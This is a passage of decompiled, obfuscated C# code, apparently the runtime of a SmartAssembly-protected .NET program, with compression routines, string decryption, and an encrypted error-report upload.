						class34_0.short_0[*(int*)((byte*)ptr + 56)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < 512);
				}
				else
				{
					*(int*)((byte*)ptr + 60) = class34_0.short_0[*(int*)((byte*)ptr + 56) & 0x1FF];
					*(int*)((byte*)ptr + 64) = 1 << (*(int*)((byte*)ptr + 60) & 0xF);
					*(int*)((byte*)ptr + 60) = -(*(int*)((byte*)ptr + 60) >> 4);
					do
					{
						class34_0.short_0[*(int*)((byte*)ptr + 60) | (*(int*)((byte*)ptr + 56) >> 9)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < *(int*)((byte*)ptr + 64));
				}
				array2[*(int*)((byte*)ptr + 52)] = *(int*)((byte*)ptr + 8) + (1 << 16 - *(int*)((byte*)ptr + 52));
			}
			(*(int*)((byte*)ptr + 48))++;
		}
	}

	static void smethod_159(EventArgs2 eventArgs2_0, bool bool_0)
	{
		eventArgs2_0.bool_1 = bool_0;
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int ExitProcess(uint uint_0);

	static bool smethod_160(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_3;
	}

	static string smethod_161(string string_0, string string_1)
	{
		string @string = default(string);
		try
		{
			@string = Encoding.UTF8.GetString(Class42.smethod_60(Convert.FromBase64String(string_0), Encoding.UTF8.GetBytes(string_1)));
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return @string;
	}

	static string smethod_162(Class44.Class48 class48_0)
	{
		return class48_0.string_0;
	}

	static void smethod_163(Class30.Class39 class39_0)
	{
		if (class39_0.int_4 >= 65274)
		{
			Class42.smethod_48(class39_0);
		}
		while (class39_0.int_5 < 262 && class39_0.int_7 < class39_0.int_8)
		{
			int num = 65536 - class39_0.int_5 - class39_0.int_4;
			if (num > class39_0.int_8 - class39_0.int_7)
			{
				num = class39_0.int_8 - class39_0.int_7;
			}
			Array.Copy(class39_0.byte_1, class39_0.int_7, class39_0.byte_0, class39_0.int_4 + class39_0.int_5, num);
			class39_0.int_7 += num;
			class39_0.int_6 += num;
			class39_0.int_5 += num;
		}
		if (class39_0.int_5 >= 3)
		{
			Class42.smethod_129(class39_0);
		}
	}

	static void smethod_164(Class30.Class33 class33_0, int int_0, int int_1)
	{
		if ((class33_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class33_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class33_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class33_0.byte_0, num, class33_0.byte_0, class33_0.int_0, int_0);
				class33_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class33_0.byte_0[class33_0.int_0++] = class33_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class42.smethod_23(class33_0, num, int_0, int_1);
		}
	}

	static void smethod_165(Class30.Class40 class40_0)
	{
		if (class40_0.int_2 > 0)
		{
			class40_0.byte_0[class40_0.int_1++] = (byte)class40_0.uint_0;
			if (class40_0.int_2 > 8)
			{
				class40_0.byte_0[class40_0.int_1++] = (byte)(class40_0.uint_0 >> 8);
			}
		}
		class40_0.uint_0 = 0u;
		class40_0.int_2 = 0;
	}

	static byte[] smethod_166(byte[] byte_0, string string_0)
	{
		if (string_0.StartsWith("{"))
		{
			Class43.string_0 = "ERR 2006: This template was not properly processed by SmartAssembly";
			return null;
		}
		RijndaelManaged rijndaelManaged = null;
		RSACryptoServiceProvider rSACryptoServiceProvider = null;
		MemoryStream memoryStream = null;
		CryptoStream cryptoStream = null;
		try
		{
			rijndaelManaged = new RijndaelManaged();
			rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(string_0);
			rijndaelManaged.GenerateKey();
			rijndaelManaged.GenerateIV();
			byte[] array = new byte[48];
			Buffer.BlockCopy(rijndaelManaged.Key, 0, array, 0, 32);
			Buffer.BlockCopy(rijndaelManaged.IV, 0, array, 32, 16);
			memoryStream = new MemoryStream();
			try
			{
				byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
				memoryStream.WriteByte(1);
				memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
				memoryStream.Write(array2, 0, array2.Length);
			}
			catch (CryptographicException)
			{
				try
				{
					byte[] array3 = new byte[16];
					byte[] array4 = new byte[16];
					Buffer.BlockCopy(rijndaelManaged.Key, 0, array3, 0, 16);
					Buffer.BlockCopy(rijndaelManaged.Key, 16, array4, 0, 16);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
					byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
					byte[] array7 = rSACryptoServiceProvider.Encrypt(rijndaelManaged.IV, fOAEP: false);
					memoryStream.WriteByte(2);
					memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
					memoryStream.Write(array5, 0, array5.Length);
					memoryStream.Write(array6, 0, array6.Length);
					memoryStream.Write(array7, 0, array7.Length);
				}
				catch (CryptographicException)
				{
					Class43.string_0 = "ERR 2005: The 128-bit encryption is not available on this computer. You need to install the High Encryption Pack in order to use the reporting feature.";
					return null;
				}
			}
			cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
		catch (Exception ex3)
		{
			Class43.string_0 = "ERR 2004: " + ex3.Message;
			return null;
		}
		finally
		{
			rijndaelManaged?.Clear();
			rSACryptoServiceProvider?.Clear();
			memoryStream?.Close();
			cryptoStream?.Close();
		}
	}

	static void smethod_167(Class30.Class40 class40_0, int int_0, int int_1)
	{
		class40_0.uint_0 |= (uint)(int_0 << class40_0.int_2);
		class40_0.int_2 += int_1;
		if (class40_0.int_2 >= 16)
		{
			class40_0.byte_0[class40_0.int_1++] = (byte)class40_0.uint_0;
			class40_0.byte_0[class40_0.int_1++] = (byte)(class40_0.uint_0 >> 8);
			class40_0.uint_0 >>= 16;
			class40_0.int_2 -= 16;
		}
	}

	static ICryptoTransform smethod_168(byte[] byte_0, bool bool_0, byte[] byte_1, Class28 class28_0)
	{
		class28_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class28_0.object_0, new object[1] { byte_0 });
		class28_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class28_0.object_0, new object[1] { byte_1 });
		MethodInfo method = class28_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class28_0.object_0, new object[0]);
	}

	static void smethod_169(byte[] byte_0, Class53 class53_0, Delegate3 delegate3_0, string string_0, string string_1, string string_2)
	{
		try
		{
			ReportingService reportingService = new ReportingService(class53_0.string_2);
			if (class53_0.iwebProxy_0 != null)
			{
				((HttpWebClientProtocol)reportingService).set_Proxy(class53_0.iwebProxy_0);
			}
			delegate3_0(reportingService.UploadReport2(class53_0.string_1, byte_0, string_0, string_1, string_2));
		}
		catch (Exception ex)
		{
			delegate3_0("ERR 2002: " + ex.Message);
		}
	}

	static string smethod_170(string string_0)
	{
		string result = default(string);
		try
		{
			StreamReader streamReader = new StreamReader(string_0);
			result = streamReader.ReadToEnd().ToString();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static void smethod_171(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8, object object_9)
	{
		Class42.smethod_45(exception_0, new object[10] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8, object_9 });
	}

	static void smethod_172(Class30.Class37 class37_0, int int_0)
	{
		Class42.smethod_133(class37_0.class38_2);
		Class42.smethod_133(class37_0.class38_0);
		Class42.smethod_133(class37_0.class38_1);
		Class42.smethod_167(class37_0.class40_0, class37_0.class38_0.int_1 - 257, 5);
		Class42.smethod_167(class37_0.class40_0, class37_0.class38_1.int_1 - 1, 5);
		Class42.smethod_167(class37_0.class40_0, int_0 - 4, 4);
		for (int i = 0; i < int_0; i++)
		{
			Class42.smethod_167(class37_0.class40_0, (int)class37_0.class38_2.byte_0[Class30.Class37.int_0[i]], 3);
		}
		Class30.Class37.Class38 class38_ = class37_0.class38_0;
		Class30.Class37.Class38 class38_2 = class37_0.class38_2;
		Class42.smethod_84(class38_2, class38_);
		class38_ = class37_0.class38_1;
		class38_2 = class37_0.class38_2;
		Class42.smethod_84(class38_2, class38_);
	}
}
